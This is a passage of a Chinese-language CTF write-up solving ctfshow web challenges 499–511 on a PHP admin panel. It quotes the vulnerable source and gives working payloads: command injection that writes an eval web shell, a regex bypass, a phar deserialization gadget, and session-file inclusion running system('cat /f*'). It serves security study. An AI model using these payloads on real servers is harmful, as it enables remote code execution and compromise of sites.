木马写入</h2><p>这题放在这里显得有点太简单，进入管理页面后发现新增了功能系统设置。</p><p>下载源码后发现可以利用此功能写入php木马，由于文件路由的解析错误，因此直接一把梭了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br><span class="hljs-variable">$config</span> = unserialize(file_get_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings.php&#x27;</span>));<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$config</span>[<span class="hljs-variable">$key</span>]=<span class="hljs-variable">$value</span>;<br>&#125;<br>file_put_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings.php&#x27;</span>, serialize(<span class="hljs-variable">$config</span>));<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;管理员信息修改成功&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0029/image-20230405001241356.png" alt="image-20230405001241356" /></p><h2 id="web500-命令拼接">Web500 命令拼接</h2><p>使用万能密码登录之后，发现新增了数据库备份功能。</p><p>直接利用命令拼接实现RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>extract(<span class="hljs-variable">$_POST</span>);<br>shell_exec(<span class="hljs-string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../backup/&#x27;</span>.<span class="hljs-variable">$db_path</span>);<br><br><br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../backup/&#x27;</span>.<span class="hljs-variable">$db_path</span>))&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份成功&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份失败&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">db_path=db1.sql;echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); phpinfo(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; /var/www/html/shell.php</span><br></code></pre></td></tr></table></figure><h2 id="web501-正则绕过">Web501 正则绕过</h2><p>这道题的漏洞点和上一题一样，但是增加了正则匹配的WAF防止恶意输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^zip|tar|sql$/&#x27;</span>, <span class="hljs-variable">$db_format</span>))&#123;<br>shell_exec(<span class="hljs-string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../backup/&#x27;</span>.date_format(date_create(),<span class="hljs-string">&#x27;Y-m-d&#x27;</span>).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$db_format</span>);<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../backup/&#x27;</span>.date_format(date_create(),<span class="hljs-string">&#x27;Y-m-d&#x27;</span>).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$db_format</span>))&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份成功&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份失败&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份失败&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>正则表达式的需要一个开头和结尾为对应子字符串的字符串，这个正则表达式可以直接绕过。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">db_format=zip; echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); phoinfo(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; /var/www/html/shell.php;zip</span><br></code></pre></td></tr></table></figure><p>成功写入shell。</p><h2 id="web502-phar反序列化">Web502 Phar反序列化</h2><p>审计源码，发现新增了文件上传的页面，查看该页面。</p><p>分析源码发现，对文件内容没有进行限制，对文件的后缀名限制了PHP。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br><span class="hljs-variable">$arr</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$arr</span>[<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$arr</span>[<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp; <span class="hljs-variable">$arr</span>[<span class="hljs-string">&quot;size&quot;</span>]&lt;<span class="hljs-number">10241000</span> )<br>&#123;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>];<br><span class="hljs-variable">$filename</span> = md5(<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$ext</span> = pathinfo(<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;<br><span class="hljs-variable">$basename</span> = <span class="hljs-string">&quot;../img/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>move_uploaded_file(<span class="hljs-variable">$arr</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$basename</span>);<br><span class="hljs-variable">$config</span> = unserialize(file_get_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings&#x27;</span>));<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;logo&#x27;</span>]=<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>file_put_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings&#x27;</span>, serialize(<span class="hljs-variable">$config</span>));<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;文件上传成功&#x27;</span>;<br>&#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;文件上传失败&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先尝试解析漏洞，上传phtml文件，发现无法解析。找寻后发现，也不存在文件包含点。</p><p>考虑使用phar反序列化，在之前我们利用dbLog的反序列化实现了木马的写入，因此考虑上传phar文件实现反序列化。</p><p>查看包含db_class.php文件的相关文件，发现在数据库备份处存在利用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../render/db_class.php&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$pre</span>=<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../backup/&#x27;</span>.date_format(date_create(),<span class="hljs-string">&#x27;Y-m-d&#x27;</span>).<span class="hljs-string">&#x27;/db.&#x27;</span>;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$pre</span>.<span class="hljs-variable">$db_format</span>))&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份成功&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="hljs-variable">$db_format</span>))&#123;<br>shell_exec(<span class="hljs-string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="hljs-variable">$pre</span>.<span class="hljs-variable">$db_format</span>);<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$pre</span>.<span class="hljs-variable">$db_format</span>))&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份成功&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份失败&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;数据库备份失败&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>由于extract，我们可以上传POST参数代替，则在第一次file_exists时触发phar反序列化。</p><p>接下来开始攻击，构造phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;./render/db_class.php&quot;</span>;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> dbLog();<br>    <span class="hljs-variable">$var</span>-&gt;log = <span class="hljs-string">&quot;shell.php&quot;</span>;<br>    <span class="hljs-variable">$var</span>-&gt;content = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);phpinfo(); ?&gt;&#x27;</span>;<br><br>    <span class="hljs-comment">// 后缀必须为phar</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;evil.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-comment">// 设置 stubb, 增加 gif 文件头</span><br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-comment">// 添加需压缩的文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传后，查看对应的引用链接获取到对应的内容，访问admin_db_backup.php文件，上传危险参数，注意由于源码的错误，因此要在pre后加上<code>.</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pre</span>=phar://../img/aaae<span class="hljs-number">9</span>cba<span class="hljs-number">5</span>fdadb<span class="hljs-number">1</span>f<span class="hljs-number">0</span>c<span class="hljs-number">384934</span>cd<span class="hljs-number">20</span>d<span class="hljs-number">11</span>c.&amp;db_format=zip<br></code></pre></td></tr></table></figure><p>访问shell.php，利用rce读取flag。</p><h2 id="web503">Web503</h2><p>同Web502</p><h2 id="web504-目录穿越写文件反序列化">Web504 目录穿越写文件+反序列化</h2><p>这道题增加了模板区域的部分功能，首先是存在可以getContent功能，但是尝试后发现并不能读取文件。</p><p>其次是upload功能，但是限制了php后缀名的上传。</p><p>这里比较麻烦的是504关闭了之前的代码读取功能，但是又需要分析之前的代码。</p><p><code>api/admin_settings.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">session_start();<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br><span class="hljs-variable">$config</span> = unserialize(file_get_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings&#x27;</span>));<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$config</span>[<span class="hljs-variable">$key</span>]=<span class="hljs-variable">$value</span>;<br>&#125;<br>file_put_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../config/settings&#x27;</span>, serialize(<span class="hljs-variable">$config</span>));<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;管理员信息修改成功&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>利用这段，我们可以将反序列化后的内容利用upload模板功能写入<code>config/settings</code>，并在后续调用时反序列化，将木马写入。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0029/image-20230405172920985.png" alt="image-20230405172920985" /></p><h2 id="web505-文件包含">Web505 文件包含</h2><p>这道题新开了一个页面，又重新可以查看源码了。查看<code>admin_view_file.php</code>，存在文件包含的利用漏洞，因此可以利用上一题新增模块的功能写木马进入后，再文件包含利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">session_start();<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$debug</span>==<span class="hljs-number">1</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^user/&#x27;</span>, file_get_contents(<span class="hljs-variable">$f</span>)))&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$f</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;data&#x27;</span>]=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;contents&#x27;</span>=&gt;file_get_contents(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/../&#x27;</span>.<span class="hljs-variable">$name</span>));<br>&#125;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查看成功&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0029/image-20230405205004258.png" alt="image-20230405205004258" /></p><p>最后访问admin_file_view.php，传入相应的参数实现RCE</p><h2 id="web506-文件包含">Web506 文件包含</h2><p>增加了简单waf，但仍然可以用上题的方法绕过。</p><h2 id="web507-508-文件上传">Web507-508 文件上传</h2><p>这次限制了新增模板写入文件，但是我们直接可以使用头像上传的接口实现木马文件的写入</p><p>再次利用文件包含漏洞实现。</p><h2 id="web509-短标签绕过">Web509 短标签绕过</h2><p>这次头像上传增加了正则检测，可以使用短标签绕过</p><h2 id="web510-session包含">Web510 Session包含</h2><p>原来想的是session临时文件包含，但是突然意识到对于这个网站，session内的信息可以通过<code>admin_edit.php</code>完成修改。</p><p>因此直接修改avatar信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0029/image-20230405214324781.png" alt="image-20230405214324781" /></p><p>包含sess文件实现RCE</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">debug=<span class="hljs-number">1</span>&amp;f=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tmp/</span>sess_lp68oscmeumf308nqn4vtfshe4&amp;<span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web511-模板注入">Web511 